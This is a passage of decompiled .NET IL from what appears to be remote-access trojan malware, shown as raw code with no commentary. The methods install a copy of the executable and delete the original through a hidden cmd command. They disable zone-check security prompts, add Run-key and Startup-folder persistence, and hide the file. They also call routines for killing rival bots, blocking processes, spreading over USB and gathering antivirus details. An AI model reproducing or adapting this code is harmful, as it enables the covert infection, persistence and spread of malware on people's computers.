    IL_0369:  dup
    IL_036a:  ldc.i4.2
    IL_036b:  ldsfld     string j.OK::Y
    IL_0370:  stelem.ref
    IL_0371:  dup
    IL_0372:  ldc.i4.3
    IL_0373:  call       string j.OK::GetAntiVirus()
    IL_0378:  stelem.ref
    IL_0379:  dup
    IL_037a:  ldc.i4.4
    IL_037b:  ldsfld     string j.OK::Y
    IL_0380:  stelem.ref
    IL_0381:  dup
    IL_0382:  ldc.i4.5
    IL_0383:  call       string j.OK::GetAntiVirus()
    IL_0388:  stelem.ref
    IL_0389:  dup
    IL_038a:  ldc.i4.6
    IL_038b:  ldsfld     string j.OK::Y
    IL_0390:  stelem.ref
    IL_0391:  call       string [mscorlib]System.String::Concat(string[])
    IL_0396:  stloc.0
    IL_0397:  ldstr      ""
    IL_039c:  stloc.1
    .try
    {
      IL_039d:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_03a2:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_03a7:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_03ac:  ldstr      "Software\\"
      IL_03b1:  ldsfld     string j.OK::RG
      IL_03b6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_03bb:  ldc.i4.0
      IL_03bc:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string,
                                                                                                                                    valuetype [mscorlib]Microsoft.Win32.RegistryKeyPermissionCheck)
      IL_03c1:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetValueNames()
      IL_03c6:  stloc.s    V_14
      IL_03c8:  ldc.i4.0
      IL_03c9:  stloc.s    V_15
      IL_03cb:  br.s       IL_03f3

      IL_03cd:  ldloc.s    V_14
      IL_03cf:  ldloc.s    V_15
      IL_03d1:  ldelem.ref
      IL_03d2:  stloc.s    V_13
      IL_03d4:  ldloc.s    V_13
      IL_03d6:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_03db:  ldc.i4.s   32
      IL_03dd:  bne.un.s   IL_03ed

      IL_03df:  ldloc.1
      IL_03e0:  ldloc.s    V_13
      IL_03e2:  ldstr      ","
      IL_03e7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_03ec:  stloc.1
      IL_03ed:  ldloc.s    V_15
      IL_03ef:  ldc.i4.1
      IL_03f0:  add.ovf
      IL_03f1:  stloc.s    V_15
      IL_03f3:  ldloc.s    V_15
      IL_03f5:  ldloc.s    V_14
      IL_03f7:  ldlen
      IL_03f8:  conv.i4
      IL_03f9:  blt.s      IL_03cd

      IL_03fb:  leave.s    IL_0418

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_03fd:  dup
      IL_03fe:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0403:  stloc.s    V_16
      IL_0405:  ldloc.s    V_16
      IL_0407:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_040c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0411:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0416:  leave.s    IL_0418

    }  // end handler
    IL_0418:  ldloc.0
    IL_0419:  ldloc.1
    IL_041a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_041f:  ret
  } // end of method OK::inf

  .method public static void  INS() cil managed noinlining nooptimization
  {
    // Code size       1080 (0x438)
    .maxstack  8
    .locals init (uint8[] V_0,
             class [mscorlib]System.Exception V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             string V_5,
             string V_6,
             object V_7,
             class [mscorlib]System.Exception V_8)
    IL_0000:  ldc.i4     0x3e8
    IL_0005:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_000a:  ldsfld     bool j.OK::Idr
    IL_000f:  brfalse    IL_016b

    IL_0014:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0019:  ldsfld     string j.OK::DR
    IL_001e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0023:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0028:  ldstr      "\\"
    IL_002d:  ldsfld     string j.OK::EXE
    IL_0032:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0037:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_003c:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_0041:  call       bool j.OK::CompDir(class [mscorlib]System.IO.FileInfo,
                                            class [mscorlib]System.IO.FileInfo)
    IL_0046:  brtrue     IL_016b

    .try
    {
      IL_004b:  ldsfld     string j.OK::DR
      IL_0050:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0055:  ldstr      "\\"
      IL_005a:  ldsfld     string j.OK::EXE
      IL_005f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0064:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0069:  brfalse.s  IL_0089

      IL_006b:  ldsfld     string j.OK::DR
      IL_0070:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0075:  ldstr      "\\"
      IL_007a:  ldsfld     string j.OK::EXE
      IL_007f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0084:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0089:  ldsfld     string j.OK::DR
      IL_008e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0093:  ldstr      "\\"
      IL_0098:  ldsfld     string j.OK::EXE
      IL_009d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00a2:  ldc.i4.1
      IL_00a3:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_00a8:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00ad:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00b2:  call       uint8[] [mscorlib]System.IO.File::ReadAllBytes(string)
      IL_00b7:  stloc.0
      IL_00b8:  dup
      IL_00b9:  ldloc.0
      IL_00ba:  ldc.i4.0
      IL_00bb:  ldloc.0
      IL_00bc:  ldlen
      IL_00bd:  conv.i4
      IL_00be:  callvirt   instance void [mscorlib]System.IO.FileStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
      IL_00c3:  dup
      IL_00c4:  callvirt   instance void [mscorlib]System.IO.FileStream::Flush()
      IL_00c9:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
      IL_00ce:  ldsfld     string j.OK::DR
      IL_00d3:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_00d8:  ldstr      "\\"
      IL_00dd:  ldsfld     string j.OK::EXE
      IL_00e2:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00e7:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
      IL_00ec:  stsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00f1:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00f6:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00fb:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0100:  pop
      IL_0101:  ldsfld     bool j.OK::Melty
      IL_0106:  brfalse.s  IL_0146

      IL_0108:  newobj     instance void [System]System.Diagnostics.ProcessStartInfo::.ctor()
      IL_010d:  dup
      IL_010e:  ldstr      "/C choice /C Y /N /D Y /T 5 & Del \""
      IL_0113:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_0118:  ldstr      "\""
      IL_011d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0122:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_Arguments(string)
      IL_0127:  dup
      IL_0128:  ldc.i4.1
      IL_0129:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_WindowStyle(valuetype [System]System.Diagnostics.ProcessWindowStyle)
      IL_012e:  dup
      IL_012f:  ldc.i4.1
      IL_0130:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_CreateNoWindow(bool)
      IL_0135:  dup
      IL_0136:  ldstr      "cmd.exe"
      IL_013b:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_FileName(string)
      IL_0140:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(class [System]System.Diagnostics.ProcessStartInfo)
      IL_0145:  pop
      IL_0146:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_014b:  leave.s    IL_016b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_014d:  dup
      IL_014e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0153:  stloc.1
      IL_0154:  ldloc.1
      IL_0155:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_015a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_015f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0164:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0169:  leave.s    IL_016b

    }  // end handler
    IL_016b:  nop
    .try
    {
      IL_016c:  ldstr      "SEE_MASK_NOZONECHECKS"
      IL_0171:  ldstr      "1"
      IL_0176:  ldc.i4.1
      IL_0177:  call       void [mscorlib]System.Environment::SetEnvironmentVariable(string,
                                                                                     string,
                                                                                     valuetype [mscorlib]System.EnvironmentVariableTarget)
      IL_017c:  leave.s    IL_0197

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_017e:  dup
      IL_017f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0184:  stloc.2
      IL_0185:  ldloc.2
      IL_0186:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_018b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0190:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0195:  leave.s    IL_0197

    }  // end handler
    IL_0197:  ldsfld     bool j.OK::Isu
    IL_019c:  brfalse    IL_0254

    .try
    {
      IL_01a1:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_01a6:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_01ab:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_01b0:  ldsfld     string j.OK::sf
      IL_01b5:  ldc.i4.1
      IL_01b6:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_01bb:  ldsfld     string j.OK::RG
      IL_01c0:  ldstr      "\""
      IL_01c5:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_01ca:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_01cf:  ldstr      "\" .."
      IL_01d4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01d9:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_01de:  leave.s    IL_01f9

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01e0:  dup
      IL_01e1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01e6:  stloc.3
      IL_01e7:  ldloc.3
      IL_01e8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01ed:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01f2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01f7:  leave.s    IL_01f9

    }  // end handler
    IL_01f9:  nop
    .try
    {
      IL_01fa:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_01ff:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0204:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_0209:  ldsfld     string j.OK::sf
      IL_020e:  ldc.i4.1
      IL_020f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0214:  ldsfld     string j.OK::RG
      IL_0219:  ldstr      "\""
      IL_021e:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0223:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0228:  ldstr      "\" .."
      IL_022d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0232:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0237:  leave.s    IL_0254

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0239:  dup
      IL_023a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_023f:  stloc.s    V_4
      IL_0241:  ldloc.s    V_4
      IL_0243:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0248:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_024d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0252:  leave.s    IL_0254

    }  // end handler
    IL_0254:  ldsfld     bool j.OK::IsF
    IL_0259:  brfalse    IL_0437

    .try
    {
      IL_025e:  ldc.i4.7
      IL_025f:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0264:  ldstr      "\\"
      IL_0269:  ldsfld     string j.OK::RG
      IL_026e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0273:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0278:  brfalse.s  IL_0294

      IL_027a:  ldc.i4.7
      IL_027b:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0280:  ldstr      "\\"
      IL_0285:  ldsfld     string j.OK::RG
      IL_028a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_028f:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0294:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0299:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_029e:  ldc.i4.7
      IL_029f:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02a4:  ldstr      "\\"
      IL_02a9:  ldsfld     string j.OK::RG
      IL_02ae:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02b3:  ldc.i4.1
      IL_02b4:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string,
                                                               bool)
      IL_02b9:  ldc.i4.7
      IL_02ba:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02bf:  ldstr      "\\"
      IL_02c4:  ldsfld     string j.OK::RG
      IL_02c9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02ce:  call       string [mscorlib]System.IO.Path::GetFileNameWithoutExtension(string)
      IL_02d3:  stloc.s    V_5
      IL_02d5:  ldc.i4.7
      IL_02d6:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02db:  ldstr      "\\"
      IL_02e0:  ldloc.s    V_5
      IL_02e2:  ldstr      ".url"
      IL_02e7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_02ec:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_02f1:  brfalse.s  IL_030f

      IL_02f3:  ldc.i4.7
      IL_02f4:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02f9:  ldstr      "\\"
      IL_02fe:  ldloc.s    V_5
      IL_0300:  ldstr      ".url"
      IL_0305:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_030a:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_030f:  ldc.i4.7
      IL_0310:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0315:  ldstr      "\\"
      IL_031a:  ldsfld     string j.OK::RG
      IL_031f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0324:  stloc.s    V_6
      IL_0326:  ldc.i4.7
      IL_0327:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_032c:  ldstr      "\\"
      IL_0331:  ldloc.s    V_5
      IL_0333:  ldstr      ".url"
      IL_0338:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_033d:  newobj     instance void [mscorlib]System.IO.StreamWriter::.ctor(string)
      IL_0342:  stloc.s    V_7
      .try
      {
        IL_0344:  ldloc.s    V_6
        IL_0346:  ldc.i4.2
        IL_0347:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                          valuetype [mscorlib]System.IO.FileAttributes)
        IL_034c:  ldloc.s    V_7
        IL_034e:  ldnull
        IL_034f:  ldstr      "WriteLine"
        IL_0354:  ldc.i4.1
        IL_0355:  newarr     [mscorlib]System.Object
        IL_035a:  dup
        IL_035b:  ldc.i4.0
        IL_035c:  ldstr      "[InternetShortcut]"
        IL_0361:  stelem.ref
        IL_0362:  ldnull
        IL_0363:  ldnull
        IL_0364:  ldnull
        IL_0365:  ldc.i4.1
        IL_0366:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_036b:  pop
        IL_036c:  ldloc.s    V_7
        IL_036e:  ldnull
        IL_036f:  ldstr      "WriteLine"
        IL_0374:  ldc.i4.1
        IL_0375:  newarr     [mscorlib]System.Object
        IL_037a:  dup
        IL_037b:  ldc.i4.0
        IL_037c:  ldstr      "URL=file:///"
        IL_0381:  ldloc.s    V_6
        IL_0383:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0388:  stelem.ref
        IL_0389:  ldnull
        IL_038a:  ldnull
        IL_038b:  ldnull
        IL_038c:  ldc.i4.1
        IL_038d:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_0392:  pop
        IL_0393:  ldloc.s    V_7
        IL_0395:  ldnull
        IL_0396:  ldstr      "WriteLine"
        IL_039b:  ldc.i4.1
        IL_039c:  newarr     [mscorlib]System.Object
        IL_03a1:  dup
        IL_03a2:  ldc.i4.0
        IL_03a3:  ldstr      "IconIndex=17"
        IL_03a8:  stelem.ref
        IL_03a9:  ldnull
        IL_03aa:  ldnull
        IL_03ab:  ldnull
        IL_03ac:  ldc.i4.1
        IL_03ad:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_03b2:  pop
        IL_03b3:  ldloc.s    V_7
        IL_03b5:  ldnull
        IL_03b6:  ldstr      "WriteLine"
        IL_03bb:  ldc.i4.1
        IL_03bc:  newarr     [mscorlib]System.Object
        IL_03c1:  dup
        IL_03c2:  ldc.i4.0
        IL_03c3:  ldstr      "IconFile=C:\\Windows\\system32\\SHELL32.dll"
        IL_03c8:  stelem.ref
        IL_03c9:  ldnull
        IL_03ca:  ldnull
        IL_03cb:  ldnull
        IL_03cc:  ldc.i4.1
        IL_03cd:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_03d2:  pop
        IL_03d3:  ldloc.s    V_7
        IL_03d5:  ldnull
        IL_03d6:  ldstr      "Flush"
        IL_03db:  ldc.i4.0
        IL_03dc:  newarr     [mscorlib]System.Object
        IL_03e1:  ldnull
        IL_03e2:  ldnull
        IL_03e3:  ldnull
        IL_03e4:  ldc.i4.1
        IL_03e5:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_03ea:  pop
        IL_03eb:  leave.s    IL_03fe

      }  // end .try
      finally
      {
        IL_03ed:  ldloc.s    V_7
        IL_03ef:  brfalse.s  IL_03fd

        IL_03f1:  ldloc.s    V_7
        IL_03f3:  castclass  [mscorlib]System.IDisposable
        IL_03f8:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_03fd:  endfinally
      }  // end handler
      IL_03fe:  ldsfld     bool j.OK::HIDE_ME
      IL_0403:  box        [mscorlib]System.Boolean
      IL_0408:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_040d:  brfalse.s  IL_041a

      IL_040f:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_0414:  ldc.i4.2
      IL_0415:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                        valuetype [mscorlib]System.IO.FileAttributes)
      IL_041a:  leave.s    IL_0437

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_041c:  dup
      IL_041d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0422:  stloc.s    V_8
      IL_0424:  ldloc.s    V_8
      IL_0426:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_042b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0430:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0435:  leave.s    IL_0437

    }  // end handler
    IL_0437:  ret
  } // end of method OK::INS

  .method public static void  ko() cil managed noinlining nooptimization
  {
    // Code size       979 (0x3d3)
    .maxstack  5
    .locals init (bool V_0,
             int32 V_1,
             string V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             string V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10)
    IL_0000:  ldsfld     string j.OK::SLP
    IL_0005:  call       float64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToDouble(string)
    IL_000a:  ldc.r8     1000.
    IL_0013:  mul
    IL_0014:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0019:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_001e:  conv.ovf.i4
    IL_001f:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0024:  ldsfld     bool j.OK::Anti_CH
    IL_0029:  brfalse.s  IL_003e

    .try
    {
      IL_002b:  call       void MyAntiProcess::Start()
      IL_0030:  leave.s    IL_003e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0032:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0037:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003c:  leave.s    IL_003e

    }  // end handler
    IL_003e:  ldsfld     bool j.OK::BOT_KILL
    IL_0043:  brfalse.s  IL_005f

    .try
    {
      IL_0045:  call       void BotKillers::RunStandardBotKiller()
      IL_004a:  ldc.i4.s   50
      IL_004c:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0051:  leave.s    IL_005f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0053:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0058:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005d:  leave.s    IL_005f

    }  // end handler
    IL_005f:  ldsfld     bool j.OK::USB_SP
    IL_0064:  brfalse.s  IL_0079

    .try
    {
      IL_0066:  call       void spredusb::Start()
      IL_006b:  leave.s    IL_0079

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_006d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0072:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0077:  leave.s    IL_0079

    }  // end handler
    IL_0079:  ldsfld     bool j.OK::Persis
    IL_007e:  brfalse.s  IL_0093

    .try
    {
      IL_0080:  call       void Persistence::Startup()
      IL_0085:  leave.s    IL_0093

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0087:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_008c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0091:  leave.s    IL_0093

    }  // end handler
    IL_0093:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Command()
    IL_0098:  brfalse.s  IL_00dd

    .try
    {
      IL_009a:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_009f:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_00a4:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_00a9:  ldstr      "di"
      IL_00ae:  ldstr      "!"
      IL_00b3:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_00b8:  leave.s    IL_00d3

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00ba:  dup
      IL_00bb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c0:  stloc.3
      IL_00c1:  ldloc.3
      IL_00c2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
